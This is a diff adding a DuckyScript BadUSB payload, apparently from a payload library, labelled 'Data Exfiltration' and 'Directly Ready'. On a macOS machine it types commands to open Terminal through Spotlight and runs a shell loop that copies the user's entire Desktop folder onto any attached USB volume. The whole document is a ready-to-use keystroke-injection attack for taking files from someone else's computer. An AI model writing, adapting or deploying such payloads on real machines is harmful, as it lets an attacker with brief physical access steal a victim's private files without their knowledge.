@@ -1,0 +1,24 @@
+REM Title: macOS Desktop Copier
+REM Author: BadUSB Library
+REM Description: Copies Desktop files to USB drive
+REM Target: macOS 10.15+
+REM Category: Data Exfiltration
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+ENTER
+DELAY 3000
+
+REM Check for USB drives
+STRING ls /Volumes/
+ENTER
+DELAY 2000
+
+REM Copy Desktop to USB
+STRING for drive in /Volumes/*; do if [ -d "$drive" ] && [ "$drive" != "/Volumes/Macintosh HD" ]; then cp -r ~/Desktop "$drive/Desktop_Backup_$(date +%Y%m%d)"; fi; done
+ENTER
+DELAY 3000
